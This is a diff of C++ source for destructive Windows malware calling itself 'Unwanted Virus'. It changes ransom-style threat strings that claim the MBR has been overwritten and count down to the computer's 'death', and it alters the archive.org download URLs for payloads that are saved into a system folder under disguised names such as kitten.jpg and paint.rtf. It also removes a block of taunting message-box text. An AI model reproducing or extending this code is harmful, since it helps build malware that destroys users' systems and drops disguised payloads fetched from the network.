@@ -25,16 +25,16 @@ using namespace std;
 DWORD wb;
 
 /* files content */
-const unsigned char msg[] = "Hello! You have ran the called Úñåáñşéd ßí®ú’ (Unwanted Virus)\r\n\r\nYour computer is now done for anyway,\r\nkilling Unwanted.exe process will not do anything, just it rewrited the MBR...\r\nYour eta is 2 minutes, THE TIME IS RUNNING! =)";
+const unsigned char msg[] = "Hello! You have ran the called Úñåáñşéd ßí®ú’ (Unwanted Virus)\r\n\r\nYour computer is now done for anyway,\r\nkilling Unwanted.exe process will not do anything, just it rewrited the MBR...\r\nYour ETA is 2 minutes, THE TIME IS RUNNING! =)";
 const size_t msg_len = sizeof(msg);
 
 const unsigned char unfm[] = "you have found a way for end me, but I will come back and kill you\r\nand your family see me next time when... ** cough cough ** when€²ğís¡xw²¤¤\r\nğ'¬¼€» ** dies ** \n...\r\n";
 const size_t unfm_len = sizeof(unfm);
 
-const unsigned char diem[] = "ÜÓÚ ÑÉÉĞ ŞÓ ĞÍÉÉÉÉ²¼2ğ¤ú®¥½ö’«   ÜÓÚ ÑÉEĞ TÓ ĞÍÉ YOU NEED TO DIEÉÉÉ aáaááá €€¼€³¤²¤¤¬²¬\r\nïñ§tág®áµ@Endersshow@#RT#$tş¤³ş³å³äs³®É F3¤€Ş³TÅ®¤ÅŞ€ÜÉÜWŞÜÉ€Ü¤\r\n WHY ARE YOU RUNNING? WHY ARE YOU RUNNING? ÁÄÉ³ÁÅÅÁÅAÁÄÉ®Ü¼Ú¼½Í¾»¬»«¥®²³ŞÄ³®";
+const unsigned char diem[] = "ÜÓÚ ÑÉÉĞ ŞÓ ĞÍÉÉÉÉ²¼2ğ¤ú®¥½ö’«   ÜÓÚ ÑÉEĞ TÓ ĞÍÉ YOU NEED TO DIEÉÉÉ aáaááá €€¼€³¤²¤¤¬²¬\r\ntwíşşe®@Enderµañ©h@#RT#$tş¤³ş³å³äs³®É F3¤€Ş³TÅ®¤ÅŞ€ÜÉÜWŞÜÉ€Ü¤\r\n WHY ARE YOU RUNNING? WHY ARE YOU RUNNING? ÁÄÉ³ÁÅÅÁÅAÁÄÉ®Ü¼Ú¼½Íthesdjdefe¾»¬»«¥®²³ŞÄ³®";
 const size_t die_len = sizeof(diem);
 
-const unsigned char lastm[] = "ÜÓÚ\n YOU COMPUTER WILL DIE IN 10 SECONDS €¤ÜŞÅ³®²®¤³Ş\r\n³€ŞÜ¤Wé nééğ á ñéwc ímputyer guys¼€ÚÉ6YE³\r\n®²¤Ş¤€Ü¼Ú€Time is over, you killed it!¤Ş¤€Ş¤\r\n³é³å²€Ş¤\r\nWith_Lots_Of_Love<3__\r\nUnwantedVirus__goodbye!";
+const unsigned char lastm[] = "ÜÓÚ\n YOU COMPUTER WILL DIE IN 10 SECONDS äøóøğ¥¾³®²®¤³Ş\r\n³€ŞÜ¤¼€ÚÉ6YE³\r\n®²¤Ş¤€Ü¼Ú€¤Ş¤€Ş¤\r\n³é³å²€Ş¤\r\n\r\n\r\ndisgraceful";
 const size_t last_len = sizeof(lastm);
 
 const unsigned char escapem[] = "Hey! The escape is behind you,\r\nLook behind you please, Is there!!";
@@ -49,9 +49,9 @@ const wchar_t* srcURLk = L"http://archive.org/download/01101000/0000005.bin"; //
 const wchar_t* destFilek = L"C:\\Program Files\\Common Files\\system\\kitten.jpg";
 
 const wchar_t* srcURL8 = L"http://archive.org/download/01101000/0000002.bin"; 
-const wchar_t* destFile8 = L"C:\\Program Files\\Common Files\\system\\Documento.rtf";
+const wchar_t* destFile8 = L"C:\\Program Files\\Common Files\\system\\paint.rtf";
 
-const wchar_t* srcURL1 = L"http://archive.org/download/01101000/0000001.bin"; 
+const wchar_t* srcURL1 = L"http://archive.org/download/01101000/00000011.bin"; 
 const wchar_t* destFile1 = L"C:\\Program Files\\Common Files\\system\\deskbgrd.jpg";
 
 const unsigned char tdp[] = {
@@ -2078,40 +2078,6 @@ int random() {
     return out & 0x7fffffff;
 }
 
-
-/* unused messages for message boxes*/
-
-const int icon[] = {
-    MB_ICONEXCLAMATION,
-    MB_ICONWARNING,
-    MB_ICONINFORMATION,
-};
-
-const char* title[] = {
-    "úñåáñşéğ mawøá®é",
-    "\u0022ngoe\u0022",
-    "UnWaNtEd vIrUs",
-    "uNwAnTeD ViRuS",
-    "\n",
-};
-
-
-const char* msgs[] = {
-    "Hello? Do you like my trojan",
-    "R U Crazy? U Ran UNWANTED VIRUS!!",
-    "See how your computer is destroyed",
-    "\n",
-    "\u0022Really this is so?\u0022",
-    "Do you like the desk-top Back--Ground",
-    "Are you happy?",
-    "Do you have a live right now?",
-    "\nWhats going on?\n",
-    "Help!!!",
-    "zzzzzzzzzzz",
-    "Enjoy the game after this!",
-    "I will kill everyone\nStarting by you first",
-    "dID your anti-VIRUS stop this?",
-};
 
 void CreateDataFiles() {
 
